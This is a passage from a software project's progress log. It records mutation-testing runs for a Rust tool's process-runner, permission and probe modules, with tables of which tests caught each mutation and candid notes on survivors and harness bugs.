| m1 rule 1 dropped — a check that runs nothing no longer comes first | **four**, including `a_check_that_runs_nothing_comes_before_one_that_does` |
| m2 rule 2 reversed — the worst no longer comes first within a half | **three**, including `within_a_half_the_worst_comes_first` |
| m3 rule 3 dropped — alike checks keep their arrival order | `two_checks_that_are_alike_in_every_ordering_rule_are_ordered_by_identity` |
| m4 a blocked check is dropped from the plan | **four**, including `a_check_that_cannot_run_is_in_the_plan_with_its_reason_and_its_permission` |
| m5 `permissions_needed` does not deduplicate | `every_check_in_the_plan_carries_a_reason_an_evidence_class_and_its_requirements` — **the integration test, and the lib is silent** |
| m6 `blocked_by` names the last missing permission | `a_check_missing_several_permissions_names_the_first_of_them` |
| m7 `names_something` says yes to every reason | **two**, including `a_proposal_that_names_nothing_is_refused_rather_than_repaired` |
| m8 `runs_nothing` answered with `is_inspection_only` | `the_permissions_a_check_needs_are_derived_from_its_actions` |
| m9a `ExecutionRequirements::of` does not sort | `the_permissions_a_check_needs_are_derived_from_its_actions` |
| m9b `ExecutionRequirements::of` does not deduplicate | `the_permissions_a_check_needs_are_derived_from_its_actions` |
| m10 the decision is the best of the actions, not the worst | **two**, including `the_worst_of_a_checks_decisions_is_the_checks_decision` |
| m11 the ranking of decisions is inverted | **two**, the same pair as m10 |
| m12 a duplicate proposal is kept as well as the first | `the_same_check_proposed_twice_is_scheduled_once_and_the_second_is_reported` |
| m13 every occurrence of a duplicate is recorded, not the identifier once | `the_same_check_proposed_twice_is_scheduled_once_and_the_second_is_reported` |
| m14 `not_run` answers for a check that would run | `a_check_that_would_run_has_no_not_run_result_at_all` |
| m15 every entry is numbered zero | `the_schedule_hands_enforcement_its_checks_in_the_same_order` |
| m16 `may_run` answered from `blocked_by` rather than from the decision | `a_check_the_mode_stops_still_gets_a_result_saying_it_did_not_run` — **a test that exists only because this mutation survived** |
| m17 `plain_description` has two outcomes again | `an_entry_says_which_of_the_three_things_happened_to_it` |
| m18 `blocked_by` names a permission the user has already granted | **three**, including `a_check_the_mode_stops_still_gets_a_result_saying_it_did_not_run` |

**`m16` is the finding, and it survived the first run of the set.** It answered
`may_run` from `blocked_by.is_none()` instead of from the decision, and **the
whole 630-test suite passed**: the two agree whenever a check is denied a
permission — which is every case the existing tests reached — and come apart
**exactly** where every permission is granted and the mode still refuses to run
project code. A caller asking `blocked_by` would be told the check runs and would
produce **no result for it at all**, so the check would *vanish from the report*
rather than appear as one that did not happen. `a_check_the_mode_stops_still_gets_
a_result_saying_it_did_not_run` was written to hold it, and **the set was then
re-run in full against the changed file**, so the log is one vintage rather than
two — the alternative was a log whose first half was measured against a source
file that no longer exists. **The lesson is `P3-T008`'s one field over**: the
mutation did not find a bug in the code, it found that **a derived predicate had
no test of its own** three lines below the predicate it derives from.

**`m2`'s first draft did not compile, and the harness is right to refuse to call
that a survivor.** Moving `std::cmp::Reverse(proposal.severity.rank())` to
`proposal.severity.rank()` without the signature makes the key a `(bool, u8)`
where the function promises a `Reverse<u8>`, so `cargo` fails before any test
runs and `mutate3.py` prints **INCONCLUSIVE** — *the suite did not run, so this
says nothing either way*, which is the line `P3-T011` added for exactly this and
which fired here for the first time since. The mutation now carries the
signature with it. **A mutation that does not compile is not a mutation that was
caught**: the first run of the set printed nothing at all for `m2`, and the
seventeen-mutation report that came out of it counted sixteen results and one
silence. Had `mutate3.py` guessed instead of refusing — the way `mutate.py` did
before `P3-T011` added the `INCONCLUSIVE` line — the silence would have been
entered here as a survivor.

**The driver died on its own output, and the fix is the same one `mutate3.py`
documents one level up.** `print(proc.stdout)` raised `UnicodeEncodeError` on the
console's GBK codec for the first mutation whose captured output contained a byte
GBK cannot decode, and the traceback came **after** the subprocess, so the
mutation had already been restored — verified rather than assumed, by
`git hash-object` matching the blob `m1` reported as its before-and-after. The
console copy is now ASCII-escaped and the log keeps the raw text.

### `P3-T011`

**Twelve mutations: twelve caught, eleven of them by exactly one test.**
`target/tmp/mut/` holds the pairs and `target/tmp/mut/run.sh` drives them;
`target/tmp/mutate3.py` is the harness, and it requires each old text to occur
**exactly once** before it runs, so a mistyped pair fails before producing a
result rather than after producing a wrong one.

**The set was re-run while this acceptance was being written, and the re-run
corrected a number that was about to be written down again.** `P3-T011`'s mutation
evidence existed only in the context of the session that produced it, which then
ended: **the run left no log on disk, and the twelve results were about to be
entered here from memory.** They were re-run instead, the log is
`target/tmp/p3t011-mutations.log`, and **the twelve caught-or-survived outcomes
came back as remembered — but the count of tests per mutation did not.** The
remembered sentence, which is also in `be02100`'s commit message and was in
`DECISIONS.md`, read *"twelve mutations, twelve caught, ten by exactly one test
each"*; **the measured answer is eleven.** Ten was right when it was written — the
set was `m1` through `m11`, `m1` was caught by two, and the other ten by one — and
then `m2` was split into `m2` and `m2b` to stop one mutation covering both halves
of the `Unknown` guard, the set became twelve, and **the sentence describing the
set was not in the set.** Nothing reads the prose that counts the mutations, so
the re-run that caught all twelve reported twelve and the words went on saying
ten. **This is the repository's recurring defect from the other side**: not a parse
that fails into a smaller, plausible answer, but a number that was true of a
smaller set and outlived it. `be02100` is pushed and its message cannot be
rewritten, so the correction is carried in `DECISIONS.md` and here, and **every
count in this section is read out of the log rather than out of the message.**

| mutation | caught by |
| --- | --- |
| m1 an absence is reported as a pass | **two**: `every_absence_reason_is_skipped_and_none_of_them_produced_a_result` and `the_trait_is_a_seam_a_caller_can_hold` |
| m2 the never-reached guard is dropped | `a_page_that_was_never_reached_is_unknown_even_with_nothing_reported` |
| m2b the incomplete-look guard is dropped | `a_look_that_was_cut_short_is_unknown_rather_than_a_pass` |
| m3 a driver that reported no status passes | `a_driver_that_did_not_say_what_came_back_cannot_reach_green_by_saying_nothing` |
| m4 the page-status window opens to 200–599 | `a_page_request_answered_outside_the_window_fails_even_with_no_problems` |
| m5 a second door from a browser to a verdict | `there_is_one_door_from_a_browser_to_a_verdict` — **and the lib is silent** |
| m6 an unsupported platform becomes a scope limit | `a_critical_absence_that_is_not_a_scope_limit_blocks_green` |
| m7 a problem is checked after completeness | `a_problem_seen_during_a_look_that_was_cut_short_is_still_a_failure` |
| m8 the project's own switch-off is ignored | `a_check_the_project_switched_off_is_disabled_by_configuration_whatever_the_permissions_are` |
| m9 a granted permission still reports an absence | `a_browser_probe_with_the_permission_granted_leaves_the_question_to_a_driver` |
| m10 `NavigationFailed` leaves the reported kinds | `every_problem_kind_is_describable` |
| m11 the local probe's own window moves | `the_page_status_window_is_the_local_probes_window` — **only the sweep** |

**`m5` is the finding, and it is the one this task's second acceptance sentence
would have failed without.** It inserts a `pub fn a_second_door() -> CheckStatus`
immediately above the trait. The whole `sure-core` lib suite — **611 tests, 0
failed** — passes without noticing, because **a function nothing calls is not a
behaviour any test can observe**; the only thing that catches it is the source
rule in `crates/sure-core/tests/browser_probe.rs` that counts `-> CheckStatus` in
the shipped part of the module at exactly one. **An absence cannot be run**, which
is why that rule is a parse of the source rather than an assertion about a value,
and `m5` is what says the parse is doing work rather than decorating the file.

**`m11` is the cross-check earning its place.** It moves the *local probe's* own
success guard in `probe.rs` — a different file, a different task, written two
commits earlier — from `200..400` to `200..500`, and the browser module's
integration test catches it. Nothing in `probe.rs`'s own twenty integration tests
notices, because the sweep is the only test in the repository that holds the two
spellings of that window together. It is run with `--test browser_probe` rather
than the whole suite, so it is also the one mutation here whose filter names its
target.

**`m2` and `m2b` are one guard split in two, deliberately.** The condition
`!observation.complete || !observation.reached_a_page()` is a single `if` with two
reasons, and a mutation that dropped the whole branch would be caught by whichever
test covers either half — reporting one catch where there are two. So each half is
removed on its own: `m2` drops the reached-a-page test, `m2b` drops the
completeness test, and **each is caught by the test that names it and by nothing
else.** That is the shape `P3-T010`'s `m8` argued for one platform over: a
mutation caught by a test that could not distinguish its two halves measures the
`||`, not the reasons.

**The harness restored both files and the restoration was checked, not assumed**:
`git status --porcelain` lists the three progress files this acceptance edits and
nothing else, and `git hash-object` on `browser.rs` and `probe.rs` returns the
same two blobs as `git rev-parse HEAD:` for each.

### `P3-T010`

**Eleven mutations: ten caught, one survived, and the survivor is the more
useful of the two halves.** The harness is `target/tmp/mutate3.py`, unchanged for
a fourth task; the pairs are in `target/tmp/mut-p3t010/` and, for `m11`, in
`target/tmp/mut-p3t010b/`, and each was checked to match its target **exactly
once** before the harness ran, so a mistyped pair would have failed before
producing a result rather than after producing a wrong one.

| mutation | caught by |
| --- | --- |
| m1 `status()` success bound `400` → `500` | `the_status_mapping_and_the_verdict_agree_on_every_variant` |
| m2 read deadline stops the read without flagging `truncated` | `a_response_still_arriving_when_the_probe_stops_reading_is_marked_truncated` |
| m3 path predicate dropped to "starts with `/`" | `a_path_that_would_add_a_header_or_split_the_request_line_is_refused` |
| m4 zero-budget guard deleted | `a_budget_of_zero_makes_no_attempt_and_cannot_report_a_pass` |
| m5 `is_an_answer` widened to include `NoAnswer` | `an_open_port_that_says_nothing_does_not_aggregate_to_green` |
| m6 `Refused` and `Unreachable` swapped | `a_port_with_nothing_behind_it_is_refused_rather_than_unreachable` |
| m7 the silence reason replaced by the generic one | `an_open_port_that_says_nothing_does_not_aggregate_to_green` |
| m8 `WouldBlock` dropped from `is_a_timeout` | **survived all 20 integration tests**; `probe::tests::a_read_deadline_is_recognized_in_both_shapes_the_platforms_give_it` |
| m9 the early break removed | `a_reply_that_could_not_be_http_from_its_first_byte_is_not_http` |
| m10 the prefix `NotHttp` branch removed from `classify` | three tests: the cut first line, the TLS reply, the SSH banner |
| m11 the self-connect branch deleted from `get` | **nothing** — survived all 591 tests in `sure-core`, unit tests included |

**m8 survived, and no test in this repository could have caught it on this
machine.** Windows reports an expired socket read timeout as `TimedOut`; a Unix
reports the same condition as `WouldBlock`. Deleting the `WouldBlock` arm changes
nothing on Windows, so twenty integration tests — every one of which runs a real
socket — passed against a `is_a_timeout` that would report a silent port as *an
unreachable one* on macOS and Ubuntu. **The arm was held by nothing on the
platform it was written on.** The answer is a unit test inside the module, which
can run on all three platforms, and it is the only test in `sure-core` that
catches the mutation.

**The harness's filter was the second half of that finding, and it is worth
recording because every mutation table in this file used the same shape.**
`--test probe_local_service` selects an integration target and does **not** run
the lib, so the first re-run after the unit test was added still printed
`(NONE — this mutation survived)`. **A mutation reported as surviving under a
filter that could not have run the test that kills it measures the filter, not
the mutation.** Re-run with an empty filter — the whole `sure-core` suite, 591
tests — it is caught by exactly one:

```
### m8-wouldblock-not-a-timeout
    filter ''
    test result: FAILED. 590 passed; 1 failed; 0 ignored; 0 measured; 0 filtered out
    caught by 1 test(s):
      - probe::tests::a_read_deadline_is_recognized_in_both_shapes_the_platforms_give_it
```

**m11 survived the whole suite, and this time there was no wrong filter to
blame.** It deletes the self-connect branch added by `01fc2a7`, the fix for the
Windows failure `34956776646` found — and **the complete `sure-core` suite, lib
and integration targets, 591 tests, reports it caught by 0 test(s).** The blob
was restored to the pre-run hash `99fe44955357994bcf70f29686f74b7d1a7f00aa`, so
the run is a measurement rather than a lost edit. The reason is in the section
about the self-connect and it is a property of the operating system rather than
an oversight: a self-connect happens when the kernel chooses a particular port,
and it does not choose on request. **The predicate `is_a_self_connect` is covered
deterministically by a unit test that hands it two addresses; the branch that
calls it is covered by nothing, and the honest reading of `m11` is that the fix
is held by a test one level of indirection away from the line that was wrong.**
Forcing a self-connect by dialling ports that had just been released produced
**0 in 40 attempts**, and the same measurement put a refused loopback connect at
about **2.04 seconds**, so a search would be a timeout rather than a test.

**Seven of the ten caught are caught by exactly one test each, and two of those
seven share a test.** m5 and m7 both land on
`an_open_port_that_says_nothing_does_not_aggregate_to_green`, which is also the
test the acceptance is about. **Ten-for-ten is true and would be misleading**: a
reader who took it as redundancy would be wrong about two of them, and the
concentration is the shape a future deletion would exploit. `P3-T009` recorded
the same finding about its own seven, where one test held three.

**Every run printed the blob restored to the pre-run hash**, and the harness
compares against the pre-run blob rather than `HEAD`, because this file's target
was uncommitted work at the time — the case `P3-T008` added that wording for.

### `P3-T008`

Twelve mutations, two harnesses and one mutation that was not against the code.
`target/tmp/mutate3.py` is `mutate.py` generalised to any file and any `cargo test`
filter, so that the *wording* half of this task's acceptance could be mutated too —
three of the twelve change a document or a `&'static str` rather than a branch, and
without a general harness that half would have been asserted rather than checked.

| # | what was broken | caught by | verdict |
| --- | --- | --- | --- |
| 1 | the mount's `ReadOnly` default → `ReadWrite` | 3 tests | caught |
| 2 | `for_command`'s network branch → always `On` | 1 | caught |
| 3 | the `,readonly` suffix removed from the specification | 2 | caught |
| 4 | the working-directory guard disabled | 1 | caught |
| 5 | the `,`/`=` path refusal removed | 1 | caught |
| 6 | `Runtime::ALL` reversed | 2 | caught |
| 7 | the clause boundary loses its comma | 1 | caught |
| 8 | the denial list always grants | 1 | caught |
| 9 | `EXECUTION_SAFETY.md` reverted to "isolated container" | 1 | caught |
| 10 | ADR 0009 reverted to "isolated environment" | 1 | caught |
| 11 | the consent prompt reverted to "isolated container" | 2 | caught |
| 12 | **`doctor.rs`'s empty-`PATH`-entry filter deleted** | **none — SURVIVED** | **gap** |

**Number 12 is a finding rather than a mutation that failed**, and it is the first
one this branch has recorded that it did not close. `doctor::find_in` documents
the rule; no test holds it; the whole workspace suite is green with the filter
gone (45 result lines, 0 failed, exit 0, measured this session with the worktree
restored afterwards and the blob checked). The nearest existing test passes an
empty *directory*, which exercises nothing, and the observable difference needs a
file in the working directory that `can_be_run` accepts — which on Unix means an
execute bit no file in this crate's root has. See the `P3-T008` section above for
why the fix was left to `doctor` rather than folded in.

**Numbers 7 and 11 are corrections to this commit's own first version, and both
were found by tests rather than by review.** Number 7's rule — the clause boundary
— originally lacked the comma, and the sentence its own documentation names as the
thing it exists to catch (*"Docker is not installed, and the container is an
isolated container"*) passed it. Number 9's document originally quoted the old
wording in order to correct it, and the scan flagged it correctly: the rule cannot
tell a quotation from a claim. Both fixes make the rule **stricter**, so both
mistakes were in the safe direction and both were real.

#### The harness failed its own first run, and reported both failures

`mutate3.py` produced two false verdicts on its first execution and neither was in
the code under test.

1. **`text=True` decodes subprocess output with the locale encoding, which is GBK
   on this machine.** A mutation whose `cargo test` output contained a byte GBK
   cannot decode raised inside the reader thread: the subprocess finished, the
   decode failed, and the harness died before it could report anything. One
   mutation was reported as *nothing at all*. The tree was restored by the
   `finally` regardless — the next mutation's `before` blob proved it — but a
   harness that can lose a result is a harness whose silence means nothing. Fixed
   with `encoding="utf-8", errors="replace"` on the subprocess call.
   **`mutate.py` has the same latent bug and did not hit it**: its filter and its
   test names are ASCII, so the `P3-T007` record stands unchanged.
2. **The filter was passed as one `argv` element**, so `cargo` answered
   `unexpected argument '--test container_isolation_claim' found` and three
   mutations were reported as *survivors of a suite that never started*. Both
   halves are fixed: the filter is split, and **the reporting now says
   `INCONCLUSIVE` rather than "this mutation survived" when there is no
   `test result:` line.** That second half is the one that matters — the run
   printed the diagnostic and then contradicted it in the summary, which is the
   same shape as the `P3-T007` finding one level up.

#### What the guards are, and why each exists

The exactly-once anchor check, the restore in a `finally`, and a blob comparison
after the restore, all carried over from `mutate.py` with the same doc comments.
Two more were exercised this session rather than assumed:

- **The exactly-once check refused an anchor that had been mangled by the shell
  that wrote it.** Mutation 7's `.old` file contained a real newline where the
  anchor needed the two characters `\` and `n`, so it matched zero times and the
  harness refused without touching the tree. A wrong anchor and an applied
  mutation are indistinguishable from a count, which is why the refusal prints the
  file and the count rather than a bare boolean — the same lesson `P3-T004`
  recorded about its own harness.
- **The restore is checked rather than trusted.** Every run prints the blob
  before and after. For an uncommitted file the harness compares with the
  *pre-run* blob and says so, because comparing with `HEAD` would report a mismatch
  for every file this session has edited and has not committed — which it did, on
  the first three document mutations, and which is noise rather than a finding.

### `P3-T007`

**Four mutations, run one at a time rather than by a driver script, and the
harness is smaller than `P3-T005`'s because the module is.** `target/tmp/mutate.py`
(git-ignored) applies **one** literal string replacement from
`<name>.old` → `<name>.new` to `crates/sure-core/src/enforce.rs`, runs
`cargo test -p sure-core --lib enforce`, and restores from
`target/tmp/enforce.orig.rs` in a `finally`. Two guards make it a harness rather
than a script: it **refuses unless the old text occurs exactly once** — a mutation
that silently matched nothing would print a green suite and be read as a mutation
that survived — and the restore is **checked rather than trusted**, by comparing
`git hash-object crates/sure-core/src/enforce.rs` with
`git rev-parse HEAD:crates/sure-core/src/enforce.rs`.

**All four were re-run during this acceptance, on the final tree, and the numbers
below are that run's rather than the implementation session's.** The filter is
sound and that is measured rather than assumed: every line reads
`557 filtered out` out of 573 library tests, so `enforce` selects **16** — exactly
the module's own `#[test]` count, neither the whole suite nor nothing.

| # | what was broken | caught by, on `719253e` | caught by, when found |
|---|---|---|---|
| 1 | a stopped check admitted instead of excluded | 6 tests | 6 tests |
| 2 | `admitted` computed from `is_allowed()` instead of from the admitted checks | 2 tests | 2 tests |
| 3 | **the static/dynamic branch replaced by an unconditional `static_checks` push** | **2 tests** | **1 test** |
| 4 | the `unscheduled` rule removed | 1 test | 1 test |

**Mutation 3's two columns are the whole point of the third commit, and the
difference between them is a test that did not exist when the mutation was first
run.** `CheckPlan`'s two lists are the whole of what a report can say about *how* a
check will be performed — a reader of `static_checks` is told nothing is launched,
a reader of `dynamic_checks` is told project code will run — and collapsing them
broke **exactly one test**, which was asserting `dynamic_checks.len() == 1` for the
unrelated purpose of showing that a granted install becomes a dynamic check rather
than disappearing. **A field whose contract hangs on one unrelated assertion is a
field nothing is holding.** The second column is `1`; the first is `2`, and the
name that moved it is
`a_check_is_dynamic_exactly_when_one_of_its_commands_runs_project_code`.

**And the non-vacuity guard added in the first commit does not cover this, which is
worth writing down rather than only fixing.** That guard counts the effects of
*admitted commands*; it has nothing to say about which list a check was put in. It
would have caught a mutation that admitted a command running project code, and it
is silent about one that merely mislabels the check. **Two different claims, and
only one of them had a test** — which is the general form of what a mutation run is
for, and the reason it is recorded here rather than in a commit message only.

`a_check_is_dynamic_exactly_when_one_of_its_commands_runs_project_code` reads the
rule directly: for every check in every plan the matrix builds, it requires
`plan.dynamic_checks.contains(id)` to equal whether any of that check's commands
runs project code — the classification being about what a check's commands *would*
use, which is why a check that was itself excluded is in neither list and is not
checked here. It carries its own non-vacuity guard, and this one is the right shape
for it: a matrix that only ever built one kind of check could not tell the two
lists apart at all, so the test records whether it saw both and fails if it did
not.

**The three that were caught first time are worth a line each, because each is a
rule rather than a line of code.** *Mutation 1* — admitting a stopped check —
breaks the latch that `CheckPlan::exclude`'s return value provides, and six tests
see it, including the batch-file test and the one-refused-command test, which is
what "a check is a unit" failing looks like from six directions at once.
*Mutation 2* — computing `admitted` from `is_allowed()` instead of from the checks
that were admitted — is caught by two, and it is the mutation the `admitted`
iterator exists to make impossible to get wrong quietly: `is_allowed()` is a
property of one command and `admitted()` is a property of the plan.
*Mutation 4* removes the `unscheduled` rule, and one test catches it — one more
than the rule had before the test was written.

**The restore was verified after the last run and not only inside it**: the working
tree's `enforce.rs` and `target/tmp/enforce.orig.rs` are both blob
`6caf3a22511a3da6506de74485574b79cb45ad32`, which is `HEAD:crates/sure-core/src/enforce.rs`.
So no mutation is in any of the three commits, and the check is a hash comparison
rather than a re-reading of the file.

### `P3-T005`

`target/tmp/mutate21.py` (git-ignored), **24** mutations, exit 0: *"all 24
observable mutations caught by a failing test, and 0 declared unobservable as
expected"*, 0 `SKIP`, 0 `BUILD`, unmutated baseline green first. **Nothing is
declared unobservable this time and the declaration is not carried over**:
`mutate20.py`'s pair were platform rules about the classifier, and nothing in
`consent.rs` is platform-dependent at all — a declaration copied from a tree where
it was true would be a claim about this tree made by copying.

**The driver below `MUTATIONS` is byte-identical to `mutate20.py`'s**, which was
checked by comparison rather than by copying carefully. Each guard in it carries a
doc comment naming the false verdict it exists to prevent, so a fresh copy is a
fresh chance to lose one.

**It found a real hole on its first run, and the fix was a test rather than an
argument.** Deleting the loop in `PermissionPlan::explain` that appends each
command's lines left the entire suite green: `PlannedCommand::explain` is covered
from several directions and the plan's — the one a report actually calls — from
none. It is now held by `a_plan_explains_every_command_it_holds`, which takes its
expected line count from the commands rather than from a written-down number.

**The four families, and the one that matters most.** *A refused command is never
a pass*: `refusal` returning a `Pass`, keeping the reason but zeroing the weight,
`refusal_reason` inverted, `exclude_refused_from` walking the allowed commands,
`refusals()` built from the allowed ones, and `is_allowed` weakened to include
`NeedsConsent`. *The three decision rules*: rule one removed, rule two removed and
its two answers swapped, the mode rule inverted, and `runs_project_code` losing
`Install` — **which is caught twice, by the agreement test against `decide` and by
the test named for the finding**. *The plan explains itself*: a requirement losing
the category that asked for it, `needs_of` answering nothing, `reason_for` mapping
a permission to the wrong reason, `standing` calling a command that needs approval
one that may run, the ungrantable paragraph filtered away, the plan's own `explain`
losing its commands, and `permissions_missing` inverted. *The plan describes the
command it would run*: `PlannedCommand::new` classifying the program without its
arguments, and `display` dropping its quoting.

**And the harness's own exit code was wrong on the first run.** The invocation was
`python target/tmp/mutate21.py | tee …`, so a run printing `NOT CAUGHT (1)` exited
0. Nothing was concluded from it — the report said `NOT CAUGHT (1)` in as many
words and that is what was read — but the accepted run is `set -o pipefail` plus
an explicit `${PIPESTATUS[0]}`, because the number a person glances at to decide
whether a run passed has to be the run's number.

### `P3-T004`

**Added in `P3-T005`'s acceptance commit, because the previous task recorded its
mutation run in the narrative above and did not add it to this list**, which
claims to be the record of mutation verifications on this branch. The figures are
the ones in the task's own acceptance note, which was written at the time.

`target/tmp/mutate20.py`, **29** mutations: *"all 27 observable mutations caught by
a failing test, and 2 declared unobservable as expected"*. Three findings: the
harness **refused to start** because an anchor matched 0 times, which is what a
leftover mutation looks like and was a wrong anchor instead; the two mutations
declared unobservable **came back CAUGHT**, because `cfg!` compiles both arms and
then runs one, so it is the *Windows* rule applied everywhere that this platform
cannot see; and one mutation was **MISSED** and closed with a test —
`is_batch_file`'s lowercasing is invisible through `classify` on Windows because
`normalise` already ran it.

### `P3-T003`

`target/tmp/mutate19.py` (git-ignored), **35** mutations — **one more than
`P3-T002`'s run of `mutate18.py`** — exit 0: *"all 33 observable mutations caught
by a failing test, and 2 declared unobservable as expected"*, 0 `SKIP`, 0 `BUILD`,
unmutated baseline green first. **No mutation was removed and no declaration was
weakened**, so the arithmetic is `34 → 35` mutations and `32 → 33` observable, and
the two declared unobservable are the same two.

**It was run twice, on two trees, and the two logs are byte-identical — which is a
fact about Windows rather than about the harness.** The first run was taken on the
implementation tree at `12:31`, before `b0dcc69` existed; the second on the frozen
tree at `12:55`, with `process_runner.rs` at md5
`ef01e9f7188a66a68105e5e1c270a6db` before and after. **Everything the macOS fix
changed is `#[cfg(unix)]` or `#[cfg(target_os = "macos")]` code**, so the set of
tests that can catch a mutation on this machine is identical on both trees — the
same reason the local suite count did not move between them. A reader who found
two mutation logs identical across a fix would be right to be suspicious, and that
is the check that settles it: they are identical *because the fix is not compiled
here*, which is also the reason this task needed CI at all.

**The mutation added this time is the mistake that is actually available in this
code**: *"the program in the error is turned into text on the way out"*,
`OsString::from(request.program().to_string_lossy().into_owned())` at the
`NotStarted` site. It is caught **alone**, and the display cap does not hide that
this time — the one name printed under it is
`a_program_name_that_is_not_a_windows_path_is_refused_rather_than_mangled`. **This
is the difference between this task's mutation and `P3-T002`'s**: the four matrix
tests `P3-T002` added are characterisation tests that no mutation of the runner as
written can fail, and this one is not — the code already has the round trip in it,
and the mutation removes it. Its catcher can only be a name that is not valid
Unicode, which is why the Windows test is built on an unpaired surrogate.

**The harness is a new file rather than an edit, and the anchor is two lines
rather than one.** `mutate19.py` is `mutate18.py` plus this mutation, written out
because the suite changed and a harness is evidence about a specific tree. The new
anchor includes `working_directory: working_directory.to_path_buf(),` as well as
the `program:` line, because `mutate18.py` already anchors on
`program: request.program().to_os_string(),` for a *different* replacement — and a
one-line anchor would have made the two indistinguishable to the harness's own
"already mutated?" preflight, which is the check that turns an interrupted run
into a refusal instead of a table of false verdicts.

**One harness run was stopped and discarded, by the session rather than by a
reviewer.** The test file was edited while a re-run was in flight, so its
mutations were being judged against two different suites and a verdict from it
would have been a number with no meaning. Killing it mid-mutation left
`crates/sure-core/src/process/request.rs` carrying mutation 2 — *"the program is
put through a command interpreter so a command line works"* — which was read,
recognised and restored with `git checkout --` before the harness was started
again on a frozen tree. **The run recorded above is the one taken afterwards**,
and it is the same failure the harness's own preflight refuses to run from,
produced this time by the session. The mutation's byproduct
`crates/sure-core/ran.txt` appeared again holding `it ran`; inspected and deleted
before any git write.

### `P3-T002`

`target/tmp/mutate18.py` (git-ignored), **34** mutations — **one more than
`P3-T001`'s run of the same file** — exit 0: *"all 32 observable mutations caught
by a failing test, and 2 declared unobservable as expected"*, 0 `SKIP`, 0 `BUILD`,
unmutated baseline green first. **No mutation was removed and no declaration was
weakened**, so the arithmetic is `33 → 34` mutations and `31 → 32` observable, and
the two declared unobservable are the same two.

The one addition joins the **command** family, which is now 6 rather than 5:
*"the program path is quoted, in case it has a space in it"*, replacing
`Command::new(&self.program)` with a `format!` that wraps the program in quotes.
It is the mutation this task's subject most obviously invites — a path with a
space is the reason to quote, and the process API quotes the program itself — and
it is a real hazard rather than a synthetic one, because `Command::new` is the
line that exists to avoid exactly this.

**The display cap bit again, and this time it was anticipated rather than
discovered.** `main()` prints `fired[:3]`, and the three names it printed for this
mutation are
`a_batch_file_named_with_its_extension_runs_and_windows_brings_the_interpreter`,
`a_cancelled_run_is_stopped_before_its_deadline` and
`a_cancelled_run_reaches_what_it_started_too` — **none of them the test this task
added.** So "does the new test catch the new mutation" could not be answered from
the harness output at all, and was answered by applying the mutation by hand and
running that one test: `a_program_at_a_path_with_a_space_and_unicode_is_the_program_that_runs`
fails alone in **0.01s** with `os error 123`, `ERROR_INVALID_NAME`, before any
process is started. Reverted, and `git status` read clean afterwards. The rule
this file drew from the last time — *a display cap is a display cap; the count
that matters is the one in the sentence the harness prints when it is done* — was
followed, and it was followed by not trusting the display either way.

**The two declared unobservable are unchanged, and this task did not make them
observable.** No test holds a stream open past `DRAIN_GRACE`, and no test can make
`taskkill` exist and fail. The tree tests now reach further into a tree than
`P3-T001`'s did, and a reader might expect that to change the second declaration;
it does not, because the limitation is the ability to make a program exist **and**
fail, not the depth of the tree.

### `P3-T001`

`target/tmp/mutate18.py` (git-ignored), 33 mutations over the four mutated files
of `src/process/` (`mod.rs`, `outcome.rs`, `request.rs`, `terminate.rs`; `error.rs`
is declarations only), exit 0: *"all 31 observable mutations caught by a failing
test, and 2 declared unobservable as expected"* — 0 `SKIP`, 0 `BUILD`, and the
unmutated baseline run first was green, which it has to be: a mutation cannot be
credited with a failure that was already there.

Three families, matching the three things the runner promises — the program it
started, the time and output it allowed, and what became of it:

- **The command** (5). Every way of running something other than what the request
  named: joining the arguments and splitting them again the way a shell would;
  putting the program through a command interpreter; running it wherever SURE
  happens to be rather than in the working directory it was given; passing on
  SURE's whole environment when the request named only a few variables; passing on
  a variable the request explicitly asked to keep back. The first two are the
  Windows spelling hazards `Command::new(&self.program)` exists to avoid, and they
  are the reason `tests/spawn_sites.rs` holds the *shape* of the call as a test.
- **The stop** (9). A deadline that passes and the run is not stopped; a
  cancellation that arrives mid-run and is not noticed, or that was already set
  before the run and the run starts anyway; the tree not claimed; a stop that
  reached the whole tree reporting that it reached one process; the tree killed
  with a program that is not there.
- **The record** (17). Every way of making the `Outcome` say more than the run
  supports: a timed-out run reported as a cancelled one and the reverse; every
  program reported as having ended successfully; a run that never started reported
  as one that ran and was stopped; a duration of zero; a start time that is not
  when it started; the output bound keeping everything, or throwing bytes away
  without counting them; a merely-non-empty stream called cut short, or a stream
  with one discarded byte not called cut short; an interrupted read reported as a
  failed one; a stream SURE could not finish reading reported as one that ended;
  the two bounds written into each other's fields; a program that was not found
  reported as a directory that is not there; a working directory that is not a
  full path, or is a file, never checked; and `Cancellation` never set, always
  set, and new-already-cancelled.

**The two declared unobservable are both about a path that cannot be reached from
a test, and each is declared with the condition that would make the declaration
wrong.** The grace for a stream that is still open being raised to an hour is
unobservable because no test holds a stream open past `DRAIN_GRACE` — the
declaration is true only while that stays so. `taskkill`'s own failure being read
as the tree having been stopped is unobservable because the tests can only reach
`is_ok_and(|status| status.success())` on a `taskkill` that either exists and
succeeds or does not exist at all; there is no way to make `taskkill` exist and
fail without replacing it. **Both are recorded as holes rather than closed by a
weaker assertion**, which is the whole point of declaring them.

**`main()` prints only the first three names under each `CAUGHT`, and that capped
display cost this session an hour of false reconciliation.** It prints
`fired[:3]`, while the verdict is computed from the full list — so a mutation that
fails five tests shows three, and two runs whose *verdicts are identical* can look
like they disagree about which tests fired. The two runs were reconciled by
reading the harness rather than by re-running it, and then confirmed by two
isolated re-runs that produced the same five-name failure set for mutation 2. **A
display cap is a display cap; the count that matters is the one in the sentence
the harness prints when it is done.**

### `P2-T008`

`target/tmp/mutate14.py` (git-ignored), 24 mutations over one file, exit 0:
*"all 21 observable mutations caught by a failing test, and 3 declared
unobservable as expected"* — 0 `SKIP`, 0 `BUILD`, and the unmutated baseline run
first was green, which it has to be: a mutation cannot be credited with a failure
that was already there.

**The first run of this harness was not clean, and that run is the more useful
artefact.** It reported 1 `SKIP`, 1 `BUILD` and 4 `MISSED`. Every one of the four
holes was real and was closed by adding a test, not by reclassifying the
mutation:

- The `SKIP` was an anchor `cargo fmt` had collapsed from two lines onto one, so
  the mutation was never applied. **A zero-count anchor and a dead pattern are the
  same output**, which is why the harness prints `SKIP` as its own verdict rather
  than treating it as a catch.
- The `BUILD` was a `while let` → `if let` rewrite that left the bound offset
  unused and would not compile. It was rewritten to bind it. A non-zero exit with
  no `FAILED` line says nothing about whether a test would have noticed the
  behaviour, so it stays out of the caught count.
- Three mutations survived for want of a test, and each is now held by one:
  a `+`-concatenated argument written **without** a space — the spaced spelling is
  rejected by the space alone, so only the unspaced form exercises the rule — a
